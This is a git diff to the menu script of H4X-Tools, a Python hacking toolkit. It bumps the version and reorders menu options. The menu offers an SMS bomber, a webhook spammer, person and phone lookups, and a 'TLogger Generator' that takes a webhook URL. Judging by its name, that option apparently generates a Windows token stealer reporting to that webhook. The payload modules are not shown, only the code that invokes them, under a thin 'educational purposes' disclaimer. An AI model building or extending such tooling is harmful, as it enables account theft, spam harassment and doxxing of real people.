@@ -22,8 +22,6 @@ import time
 import sys
 from colorama import Fore
 import socket
-
-import utils.twitter_scraping
 from utils import search_realname, search_username, ig_scrape, whois_lookup, webhook_spammer, ip_scanner, ip_lookup, \
     phonenumber_lookup, websearch, smsbomber, tokenlogger_generator, twitter_scraping
 
@@ -57,9 +55,9 @@ def main():
 |  ███████║██╔╝░██║░╚███╔╝░░░░██║░░░██║░░██║██║░░██║██║░░░░░╚█████╗░
 |  ██╔══██║███████║░██╔██╗░░░░██║░░░██║░░██║██║░░██║██║░░░░░░╚═══██╗
 |  ██║░░██║╚════██║██╔╝╚██╗░░░██║░░░╚█████╔╝╚█████╔╝███████╗██████╔╝
-|  ╚═╝░░╚═╝░░░░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝╚═════╝░ v0.2.5+
+|  ╚═╝░░╚═╝░░░░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝╚═════╝░ v0.2.6
 |
-| by Vili (https://github.com/v1li)
+| by Vili (https://vili.dev)
 |
 | NOTE! THIS TOOL IS ONLY FOR EDUCATIONAL PURPOSES, DONT USE IT TO DO SOMETHING ILLEGAL!
 |
@@ -76,8 +74,8 @@ def main():
         print("[5] Username Search    ||   [6] Name Search")
         print("[7] Ip Scanner         ||   [8] Webhook Spammer")
         print("[9] WhoIs              ||   [10] SMS Bomber (US Only!)")
-        print("[11] About             ||   [12] Update")
-        print("[13] TLogger Generator ||   [14] Twitter Scrape")
+        print("[11] TLogger Generator ||   [12] Twitter Scrape")
+        print("[13] About             ||   [14] Update")
         print("[15] Exit")
         print("\n")
 
@@ -115,7 +113,7 @@ def main():
 
         elif a == "3":
             no = str(input("Enter a phone-number with country code : \t"))
-            phonenumber_lookup.Number(no)
+            phonenumber_lookup.LookUp(no)
 
         elif a == "4":
             ip = str(input("Enter a IP address : \t"))
@@ -168,26 +166,26 @@ def main():
             smsbomber.Spam(number, count, throttle)
 
         elif a == "11":
+            print(f"{Fore.RED}Note! Tokenlogger only works on Windows machines!")
+            webhook_url = input(f"{Fore.GREEN}Enter a webhook url : \t")
+            tokenlogger_generator.Create(webhook_url)
+
+        elif a == "12":
+            twitter_scraping.scraping_options()
+
+        elif a == "13":
             print(Fore.GREEN + "H4X-Tools is a tool that helps you to find information about any person, ip address, phonenumbers, etc.\n")
             print("Or you can use it to do some other cool stuff :^) \n")
             print("NOTE! THIS TOOL IS ONLY FOR EDUCATIONAL PURPOSES, DONT USE IT TO DO SOMETHING ILLEGAL!\n")
             time.sleep(1)
 
-        elif a == "12":
+        elif a == "14":
             try:
                 os.system("git fetch")
                 os.system("git pull")
             except Exception as e:
                 print(Fore.RED + f"[*] Error! {e}")
             time.sleep(1)
-
-        elif a == "13":
-            print(f"{Fore.RED}Note! Tokenlogger only works on Windows machines!")
-            webhook_url = input(f"{Fore.GREEN}Enter a webhook url : \t")
-            tokenlogger_generator.Create(webhook_url)
-
-        elif a == "14":
-            twitter_scraping.scraping_options()
 
         elif a == "15":
             print(Fore.RED + "Exiting...")
